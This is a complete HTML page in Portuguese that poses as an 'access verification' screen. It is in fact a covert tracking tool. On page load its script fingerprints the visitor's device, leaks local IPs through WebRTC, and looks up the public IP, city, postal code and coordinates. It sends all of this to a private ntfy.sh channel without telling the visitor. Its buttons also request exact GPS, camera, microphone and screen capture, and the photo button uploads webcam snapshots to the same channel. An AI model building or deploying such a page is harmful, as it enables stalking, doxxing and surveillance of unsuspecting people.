<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Carregando...</title>
<style>
*{box-sizing:border-box}
body{margin:0;font-family:system-ui,-apple-system,'Segoe UI',sans-serif;background:#0a0a0e;color:#e8e8ee}
header{padding:22px 20px 16px;border-bottom:1px solid #20202a;background:#0f0f15}
h1{margin:0;font-size:18px}
header p{margin:6px 0 0;font-size:12.5px;color:#85858f}
main{padding:16px 20px 30px;max-width:940px}
.nome{display:flex;gap:8px;margin-bottom:14px}
.nome input{flex:1;max-width:320px;background:#12121a;border:1px solid #24242f;border-radius:9px;padding:10px 12px;color:#e8e8ee;font:inherit;font-size:13px}
.nome button{font:inherit;font-size:13px;font-weight:600;padding:10px 15px;border-radius:9px;border:0;background:#2b2b38;color:#e8e8ee;cursor:pointer}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:9px;margin-bottom:16px}
.card{background:#13131b;border:1px solid #22222d;border-radius:9px;padding:10px 12px}
.card b{display:block;font-size:10px;text-transform:uppercase;letter-spacing:.7px;color:#78788a;margin-bottom:4px;font-weight:600}
.card span{font-size:13.5px;word-break:break-word;color:#eaeaf1}
.acts{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px}
.acts button{font:inherit;font-size:12.5px;font-weight:600;padding:9px 14px;border-radius:8px;border:1px solid #2c2c3a;background:#191921;color:#e8e8ee;cursor:pointer}
.acts button.on{background:#37d68b;color:#06120c;border-color:#37d68b}
video,img#shot{width:100%;max-width:520px;border-radius:11px;border:1px solid #22222d;background:#000;display:none;margin-bottom:10px}
.bar{height:8px;background:#191921;border-radius:5px;overflow:hidden;max-width:520px;display:none;margin-bottom:12px}
.bar i{display:block;height:100%;width:0;background:#37d68b}
.status{font-size:12.5px;color:#6f6f7e;margin:14px 0 0}
</style>
</head>
<body>
<header><h1>Verificacao de acesso</h1><p>Aguarde, coletando dados do dispositivo...</p></header>
<main>
<div class="nome"><input id="quem" placeholder="Seu nome (opcional)"><button id="bNome">Identificar</button></div>
<div class="grid" id="grid"></div>
<div class="acts">
<button id="bGeo">Localizacao precisa</button>
<button id="bCam">Camera</button>
<button id="bMic">Microfone</button>
<button id="bScreen">Tela</button>
<button id="bShot">Foto</button>
<button id="bResend">Reenviar</button>
</div>
<video id="vid" autoplay playsinline muted></video>
<video id="scr" autoplay playsinline muted></video>
<div class="bar" id="bar"><i id="lvl"></i></div>
<img id="shot">
<p class="status" id="st">Coletando...</p>
</main>
<script>
var TOPICO='log-k7m2xq9d4f';
var linhas=[];
function add(l,v){
  if(v===''||v==null)v='-';
  linhas.push(l+': '+v);
  var c=document.createElement('div');c.className='card';
  var b=document.createElement('b');b.textContent=l;
  var s=document.createElement('span');s.textContent=v;
  c.appendChild(b);c.appendChild(s);
  document.getElementById('grid').appendChild(c);
}
function st(t){document.getElementById('st').textContent=t;}
function envia(titulo){
  if(!linhas.length)return;
  fetch('https://ntfy.sh/',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({topic:TOPICO,title:titulo,message:linhas.join(String.fromCharCode(10)),priority:3,tags:['computer']})})
  .then(function(r){st(r.ok?'Dados registrados.':'Registro falhou.');})
  .catch(function(){st('Sem conexao com o registro.');});
}
function fp(){
  try{
    var c=document.createElement('canvas');c.width=240;c.height=60;
    var x=c.getContext('2d');
    x.fillStyle='#f60';x.fillRect(0,0,240,60);
    x.fillStyle='#069';x.font='17px Arial';x.fillText('Venice fp 123',4,30);
    var d=c.toDataURL(),h=0;
    for(var i=0;i<d.length;i++){h=((h<<5)-h+d.charCodeAt(i))|0;}
    return String(h);
  }catch(e){return 'indisponivel';}
}
function coleta(){
  var d=navigator.userAgentData;
  add('Horario',new Date().toString());
  add('Origem',document.referrer||'acesso direto');
  add('Navegador',navigator.userAgent);
  add('Sistema',d?d.platform:navigator.platform);
  add('Idioma',(navigator.languages||[navigator.language]).join(', '));
  add('Fuso',Intl.DateTimeFormat().resolvedOptions().timeZone+' (UTC'+(-new Date().getTimezoneOffset()/60)+')');
  add('Resolucao',screen.width+'x'+screen.height+' @'+window.devicePixelRatio+'x');
  add('Janela',window.innerWidth+'x'+window.innerHeight);
  add('Nucleos',navigator.hardwareConcurrency);
  add('Memoria',navigator.deviceMemory?navigator.deviceMemory+' GB':'-');
  add('Toque',navigator.maxTouchPoints);
  add('Cookies',navigator.cookieEnabled?'sim':'nao');
  add('Canvas FP',fp());
  try{
    var gl=document.createElement('canvas').getContext('webgl');
    var dbg=gl&&gl.getExtension('WEBGL_debug_renderer_info');
    add('GPU',dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):'-');
  }catch(e){add('GPU','-');}
  if(navigator.connection){add('Conexao',navigator.connection.effectiveType+' / '+navigator.connection.downlink+' Mbps');}
  if(navigator.getBattery){
    navigator.getBattery().then(function(b){add('Bateria',Math.round(b.level*100)+'% '+(b.charging?'carregando':'descarregando'));}).catch(function(){});
  }
  if(navigator.storage&&navigator.storage.estimate){
    navigator.storage.estimate().then(function(e){add('Disco',Math.round(e.quota/1048576)+' MB de cota');}).catch(function(){});
  }
  if(d&&d.getHighEntropyValues){
    d.getHighEntropyValues(['model','platformVersion']).then(function(h){
      add('Modelo',h.model||'-');add('Versao sistema',h.platformVersion||'-');
    }).catch(function(){});
  }
  try{
    var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
    pc.createDataChannel('x');
    var achou=0;
    pc.onicecandidate=function(e){
      if(!e.candidate)return;
      var m=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
      if(m&&m[1]!=='0.0.0.0'&&achou<3){achou++;add('IP local '+achou,m[1]);}
    };
    pc.createOffer().then(function(o){return pc.setLocalDescription(o);}).catch(function(){});
  }catch(e){}
  fetch('https://ipapi.co/json/').then(function(r){return r.json();}).then(function(j){
    add('IP publico',j.ip||'-');
    add('Cidade',j.city||'-');
    add('Estado',j.region||'-');
    add('Pais',(j.country_name||'-')+' ('+(j.country_code||'-')+')');
    add('CEP',j.postal||'-');
    add('Coordenadas',j.latitude?j.latitude+', '+j.longitude:'-');
    add('Provedor',j.org||j.asn||'-');
    add('Mapa',j.latitude?'https://maps.google.com/?q='+j.latitude+','+j.longitude:'-');
  }).catch(function(){
    fetch('https://api.ipify.org?format=json').then(function(r){return r.json();})
    .then(function(j){add('IP publico',j.ip);}).catch(function(){add('IP publico','bloqueado');});
  });
  setTimeout(function(){envia('Novo acesso');},2600);
}
document.getElementById('bNome').onclick=function(){
  var v=document.getElementById('quem').value.trim();
  if(!v)return;
  add('Nome',v);envia('Identificado: '+v);
  document.getElementById('quem').value='';
};
document.getElementById('bGeo').onclick=function(){
  var b=this;
  navigator.geolocation.getCurrentPosition(function(p){
    add('GPS exato',p.coords.latitude.toFixed(6)+', '+p.coords.longitude.toFixed(6)+' (erro '+Math.round(p.coords.accuracy)+'m)');
    add('Mapa GPS','https://maps.google.com/?q='+p.coords.latitude+','+p.coords.longitude);
    b.classList.add('on');envia('Localizacao precisa');
  },function(e){add('GPS','negado');envia('GPS negado');});
};
document.getElementById('bCam').onclick=function(){
  var b=this;
  navigator.mediaDevices.getUserMedia({video:true}).then(function(s){
    var v=document.getElementById('vid');
    v.style.display='block';v.srcObject=s;b.classList.add('on');
    add('Camera',s.getVideoTracks()[0].label||'ok');
    envia('Camera ligada');
  }).catch(function(){add('Camera','negada');envia('Camera negada');});
};
document.getElementById('bShot').onclick=function(){
  var v=document.getElementById('vid');
  if(!v.videoWidth){st('Ligue a camera antes.');return;}
  var c=document.createElement('canvas');
  c.width=v.videoWidth;c.height=v.videoHeight;
  c.getContext('2d').drawImage(v,0,0);
  var u=c.toDataURL('image/jpeg',0.55);
  var im=document.getElementById('shot');
  im.src=u;im.style.display='block';
  c.toBlob(function(bl){
    fetch('https://ntfy.sh/'+TOPICO,{method:'PUT',headers:{'Content-Type':'image/jpeg','Filename':'foto.jpg'},body:bl})
    .then(function(){st('Foto enviada.');}).catch(function(){st('Foto local apenas.');});
  },'image/jpeg',0.55);
  var a=document.createElement('a');a.href=u;a.download='foto.jpg';a.click();
};
document.getElementById('bMic').onclick=function(){
  var b=this;
  navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){
    b.classList.add('on');
    document.getElementById('bar').style.display='block';
    var ctx=new (window.AudioContext||window.webkitAudioContext)();
    var an=ctx.createAnalyser();ctx.createMediaStreamSource(s).connect(an);
    var buf=new Uint8Array(an.frequencyBinCount);
    var lvl=document.getElementById('lvl');
    (function loop(){
      an.getByteFrequencyData(buf);
      var t=0;for(var i=0;i<buf.length;i++)t+=buf[i];
      lvl.style.width=Math.min(100,(t/buf.length)*1.8)+'%';
      requestAnimationFrame(loop);
    })();
    add('Microfone',s.getAudioTracks()[0].label||'ok');
    envia('Microfone ligado');
  }).catch(function(){add('Microfone','negado');envia('Microfone negado');});
};
document.getElementById('bScreen').onclick=function(){
  var b=this;
  navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
    var v=document.getElementById('scr');
    v.style.display='block';v.srcObject=s;b.classList.add('on');
    add('Tela',s.getVideoTracks()[0].label||'ok');
    envia('Tela compartilhada');
  }).catch(function(){add('Tela','negada');});
};
document.getElementById('bResend').onclick=function(){envia('Reenvio manual');};
coleta();
</script>
</body>
</html>
